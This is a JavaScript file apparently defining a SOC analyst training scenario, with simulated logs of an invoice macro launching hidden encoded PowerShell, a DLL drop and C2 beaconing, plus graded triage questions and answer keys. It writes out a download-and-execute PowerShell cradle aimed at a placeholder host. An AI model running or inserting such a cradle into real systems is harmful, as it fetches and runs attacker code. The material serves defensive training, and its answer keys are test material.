// I5 · Encoded PowerShell on a workstation: a macro in an invoice document
// downloaded a second stage that wrote a DLL and began calling out.

import { E } from '../../engine/format.js';
import { account, hostNamed, dom, BINARIES as B } from '../../engine/env.js';
import { fakeSha256 } from '../../engine/rng.js';
import { b64ps } from '../../engine/noise.js';
import { defineScenario, ran, single, multi, text, link } from '../lib.js';

const U = account('m.castillo');
const WS = hostNamed(U.host);
const PAYLOAD = 'invoice-cdn.example';
const C2 = '198.51.100.188';
const DOC = 'Invoice_40731.docm';
const DLL = `C:\\Users\\${U.sam}\\AppData\\Roaming\\Microsoft\\upd.dll`;
const DLL_HASH = fakeSha256('I5-upd-dll');
const PS = `IEX (New-Object Net.WebClient).DownloadString('http://${PAYLOAD}/q.ps1')`;

export default defineScenario({
  code: 'I5', level: 'intermediate',
  title: 'PowerShell started with an encoded command', rule: 'EDR-0311', severity: 'high', queue: 'endpoint',
  blurb: 'An endpoint rule reports PowerShell started with an encoded command on a workstation.',
  sources: ['edr', 'proxy', 'dns', 'winsec', 'firewall', 'email'], sourceGroups: ['endpoint', 'proxy'],
  skills: ['log.endpoint', 'kno.malware', 'inv.ioc', 'inv.timeline'],
  entities: { domains: [PAYLOAD], ips: [C2] },
  alertTags: ['ps_enc'],
  build(x) {
    x.add('doc_open', E.procCreate(x.T(-660), WS.name, { user: dom(U.sam), image: B.winword.path, command_line: `"${B.winword.path}" /n "C:\\Users\\${U.sam}\\Downloads\\${DOC}"`, pid: 7420, parent_image: B.outlook.path, ppid: 3312, sha256: B.winword.sha256, signature: 'Valid (Microsoft Corporation)' }));
    x.add('ps_enc', E.procCreate(x.T(-650), WS.name, { user: dom(U.sam), image: B.powershell.path, command_line: `powershell.exe -nop -w hidden -enc ${b64ps(PS)}`, pid: 7516, parent_image: B.winword.path, ppid: 7420, sha256: B.powershell.sha256, signature: 'Valid (Microsoft Windows)' }));
    x.add('dl', E.dns(x.T(-649), { client_ip: WS.ip, query: PAYLOAD, answer: '198.51.100.187' }));
    x.add('dl', E.proxy(x.T(-648), { src_ip: WS.ip, user: dom(U.sam), method: 'GET', url: `http://${PAYLOAD}/q.ps1`, dest_ip: '198.51.100.187', status: 200, bytes_out: 310, bytes_in: x.n(49, 46) * 1024, category: 'Uncategorized', ua: 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1' }));
    x.add('drop', E.edr(x.T(-640), WS.name, 11, 'FileCreate', { user: dom(U.sam), image: B.powershell.path, pid: 7516, target_filename: DLL, sha256: DLL_HASH }));
    x.add('drop', E.procCreate(x.T(-638), WS.name, { user: dom(U.sam), image: B.rundll32.path, command_line: `rundll32.exe ${DLL},Start`, pid: 7604, parent_image: B.powershell.path, ppid: 7516, sha256: B.rundll32.sha256, signature: 'Valid (Microsoft Windows)' }));
    for (let i = 0, t = -600; t < 0; i++, t += 54 + (i % 3) * 6) x.add('beacon', E.proxy(x.T(t), { src_ip: WS.ip, user: dom(U.sam), method: 'CONNECT', url: `${C2}:443`, dest_ip: C2, status: 200, bytes_out: 610, bytes_in: 1300, category: 'Uncategorized' }));
    x.add('decoy_itps', E.procCreate(x.T(-1200), 'WS-IT-002', { user: dom('r.khan'), image: B.powershell.path, command_line: 'powershell.exe -ExecutionPolicy Bypass -File \\\\FS01\\IT\\Scripts\\Get-DiskReport.ps1', pid: 9120, parent_image: B.explorer.path, ppid: 1100, sha256: B.powershell.sha256, signature: 'Valid (Microsoft Windows)' }));
  },
  alert: () => ({
    description: `PowerShell on ${WS.name} was started with -EncodedCommand and a hidden window.`,
    entity: { host: WS.name, ip: WS.ip, user: U.sam },
    details: [['Host', WS.name], ['User', U.sam], ['Command', 'powershell.exe -nop -w hidden -enc …'], ['Rule logic', 'powershell.exe with -enc / -EncodedCommand on a workstation']],
    guidance: ['Read the parent process.', 'Decode the command.', 'Follow what happened next.'],
  }),
  intel: { [PAYLOAD]: { verdict: 'malicious', detections: '7/89', facts: [['Registered', '4 days ago']], notes: ['Serves PowerShell loaders.'] }, [C2]: { verdict: 'malicious', detections: '5/89', facts: [['Network', 'VPS hosting']], notes: ['Command-and-control for a loader family.'] } },
  sandbox: { [DLL_HASH]: { verdict: 'malicious', score: 88, facts: [['Type', 'DLL loader']], behaviours: [`Contacts ${C2} over HTTPS every minute`, 'Waits for commands'], network: [C2], dropped: [] } },
  triage: {
    checks: [{ id: 'decode', label: 'Encoded command decoded', test: ran('decode') }],
    fields: [single('parent', 'Process that started PowerShell', 6, [['winword', 'WINWORD.EXE'], ['explorer', 'explorer.exe'], ['monagent', 'The monitoring agent'], ['services', 'services.exe']], 'winword', { hint: 'Read parent_image.', explain: 'Office starting hidden PowerShell is rarely legitimate.', skills: ['log.endpoint'] })],
    verdict: { accept: 'tp', explain: 'Word launched hidden, encoded PowerShell that downloads a script.' },
    severity: { accept: 'high', explain: 'Code execution and an active outbound channel on a finance workstation.' },
    evidence: { tags: ['ps_enc'], explain: 'The encoded PowerShell with Word as parent.' },
  },
  l2: {
    fields: [
      text('decoded', 'Domain the decoded command downloads from', 8, PAYLOAD, { norm: 'domain', placeholder: 'domain', hint: 'Decode the Base64 (UTF-16LE) with the Decode tool.', explain: 'The command decodes to a DownloadString call to this domain.', skills: ['log.endpoint', 'inv.ioc'] }),
      link(single('download_ok', 'Did the download succeed', 6, [['yes', 'Yes, HTTP 200'], ['blocked', 'No, blocked by the proxy'], ['dns_fail', 'No, DNS failed']], 'yes', { hint: 'Search the proxy for the domain.', explain: 'The proxy logged a 200 and about 48 KB.', skills: ['log.network'] }), 'dl'),
      multi('iocs', 'Indicators to block and sweep', 8, [['domain', PAYLOAD], ['ip', C2], ['hash', 'SHA-256 of upd.dll'], ['office', 'outlook.office365.com'], ['ws_ip', WS.ip]], ['domain', 'ip', 'hash'], { hint: 'Collect the download domain, the destination of the periodic connections and the dropped file.', explain: 'The download domain, the C2 address and the dropped DLL.', skills: ['inv.ioc'] }),
      single('other_hosts', 'Did any other host contact the indicators', 6, [['none', 'None: only this workstation'], ['many', 'Several finance hosts'], ['server', 'The file server']], 'none', { hint: 'Search the proxy for both indicators across all hosts.', explain: 'Only one workstation appears.', skills: ['inv.scope'] }),
      single('first_event', 'First event of the chain', 4, [['open', 'The user opening the invoice document'], ['ps', 'PowerShell starting'], ['dns', 'The DNS lookup'], ['beacon', 'The first outbound connection']], 'open', { hint: 'Look at what started PowerShell.', explain: 'Word opened the document, and its macro started PowerShell.', skills: ['inv.timeline'] }),
    ],
  },
  closure: {
    disposition: { options: [['incident', 'True positive: malware execution'], ['contained', 'True positive, already contained'], ['fp', 'False positive'], ['benign', 'Benign admin script']], accept: 'incident', explain: 'An active loader is beaconing.' },
    rootCause: { options: [['macro', 'A malicious macro in an emailed invoice'], ['exploit', 'A browser exploit'], ['usb', 'Infected USB'], ['admin', 'An administrator script']], accept: 'macro', explain: 'The invoice\'s macro started the chain.' },
    actions: { options: [['isolate', `Isolate ${WS.name}`], ['block', 'Block the download domain and the C2 address'], ['purge', 'Purge the email'], ['escalate', 'Escalate to L3'], ['delete_only', 'Delete upd.dll and close'], ['isolate_finance', 'Isolate every finance host']], set: ['isolate', 'block', 'purge', 'escalate'], explain: 'Deleting one file does not remove a foothold; isolating all finance hosts is over-response.', skills: ['res.containment'] },
  },
  truth: { summary: `${U.name} opened ${DOC} from an email. Its macro started hidden, encoded PowerShell that downloaded q.ps1 from ${PAYLOAD}, wrote upd.dll and ran it with rundll32. The DLL began calling ${C2} about once a minute. No other host contacted either indicator. The IT administrator's PowerShell with -ExecutionPolicy Bypass is a signed maintenance script.`, timeline: [[-660, 'Invoice document opened.'], [-650, 'Encoded PowerShell runs.'], [-648, 'Second stage downloaded.'], [-638, 'DLL started with rundll32.'], [-600, 'Beaconing starts.']], iocs: [{ type: 'domain', value: PAYLOAD, note: 'Second-stage host' }, { type: 'ip', value: C2, note: 'Command and control' }, { type: 'sha256', value: DLL_HASH, note: 'upd.dll' }] },
  test: { tools: { l1_triage: [['decode', b64ps(PS)]] } },
});
